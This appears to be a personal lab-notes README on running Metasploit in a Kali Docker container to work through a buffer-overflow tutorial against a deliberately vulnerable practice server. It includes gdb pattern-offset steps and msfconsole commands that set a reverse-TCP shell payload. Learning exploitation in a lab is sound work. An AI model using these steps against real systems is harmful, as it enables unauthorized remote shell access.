# Getting Started With MetaSploit

## Use Kali Docker image as base

- Pull Kali image
    - Discussed [here](kalilinux/kali-linux-docker)
    - `docker pull kalilinux/kali-linux-docker`

- Add metasploit and other necessary stuff on top of it
    - Use [this](./Dockerfile.kali) Dockerfile
    - `docker build -f Dockerfile.kali -t kali_image .`

- Run the image
    - `docker run -ti -p 4444:4444 -p 8080:8080 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -v ./:/u4 kali_image /bin/bash`
    - Use `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined` so that gdb
    will work properly.
    - Use `-v` so you don't lose all of your work if you exit

## First Attempt

This is based off a very nice tutorial seen [here](https://taishi8117.github.io/2016/07/24/bof-metasploit/).  This tutorial assumes some of the stuff that is necessary about metasploit
without specifically saing it.  Namely:

1) Designed to attack over the network

While there are "local" exploits in the metasploit universe, they are
usually only used after an initial exploit gives access to a remote host.
For example, the [zpanel\_zsudo](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/zpanel_zsudo.rb)
exploit goes from user access to escalate priviledges.  This was frustrating
because I kept trying to deploy this exploit and kept running into:

```
[-] Exploit failed: The following options failed to validate: SESSION.
[*] Exploit completed, but no session was created.
```

This cryptic message meant that metasploit didn't control a shell on some remote
host, which meant it couldn't run a local exploit.  Only by *first* gaining
access to the remote system (aka establishing a meterpreter session), could the
"local" exploit be run.

> Note: It seems to be possible to trick metasploit so it thinks it's connected
to a local system, as seen [here](https://kb.help.rapid7.com/discuss/599b6461d6383b0039d7fbbd)

2) It doesn't do a great job explaing how to debug failures

I have still not been able to land an exploit, despite following the tutorial
verbatim.  Due to this effort, however, I figured out how to follow what
metasploit is trying to do via gdb.  This is possible by setting up the given
vulnerable server under gdb, then stepping through metasploits connection.

3) For simple attacks like the one in the tutorial, the binary should be *static*

This prevents having to worry about the stack being in different places, making
reply much more difficult.

## Step-by-step

1) In window (1) Setup environment

```
## Setup peda gdb plugin
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

## Add bof_lab exploit to metasplit modules
cd /u4
git clone https://github.com/taishi8117/bof_lab.git
mkdir /usr/share/metasploit-framework/modules/exploits/custom
cp bof_lab/vuln_server/bof_lab.rb /usr/share/metasploit-framework/modules/exploits/custom
```

2) In window (1), compile and run the vulnerable server

```
cd /u4/bof_lab/vuln_server
vim Makefile           ## add "-static" for replayability
make
gdb --args ./tcp__server 1234
pattern_create 1200 pattern.txt
run
```

3) In window (2), run `simple_client.py` to determine *under which conditions*
the vulnerable server crashes.

```
cd /u4/bof_lab/vuln_server
git apply patch.diff   ## found in in this repo
python simple_client.py pattern.txt 1234
```

4) The connection by `simple_client.py` should now allow the gdb session in
window (1) to continue w/o a problem.  It should have segfaulted.

```
pattern_search
p/x $esp   # Add this value to /usr/share/metasploit-framework/modules/exploits/custom
q
```

5) In window (1), set up a gdb session so you can see what metasploit is doing

```
rm ~/.gdbinit
gdb --args ./tcp__server 1234
start
```

6) In window (2), fire up metasploit and start exploiting

```
service postgresql start
ss -ant                ## check that port 5432 is open
msfconsole
use exploit/custom/bof_lab
set RHOST 172.17.0.4   ## Get this value in the Docker image by running `ip a`
set RPORT 1234
set LHOST 127.0.0.1
set LPORT 8888
set payload linux/x86/shell/reverse_tcp
run
```

7) In window (1) step through the program, watching the connection and the
values that get injected by the exploit.

For example, you should eventually start to see the byte-code of the injected
payload.  If you are using the `linux/x86/shell/reverse_tcp`, you can see what
it's trying to do at `/usr/share/metasploit-framework/modules/payloads/singles/linux/x86/shell_reverse_tcp.rb`

## Troubleshooting

- You can output debug/error messages using the elog (dlog, ...) function
    - https://github.com/rapid7/metasploit-framework/wiki/How-to-log-in-Metasploit

- Until you have exploited a program and injected a call to fire up a shell,
no sessions will be available

- The tutorial is a little consusing because, during the initial EIP/ESP
analysis, `simple_client.py` adds 4 bytes of it's own (the number of bytes about
to be sent).  This explains why there seems to be an "off by four" error
throughout the tutorial.
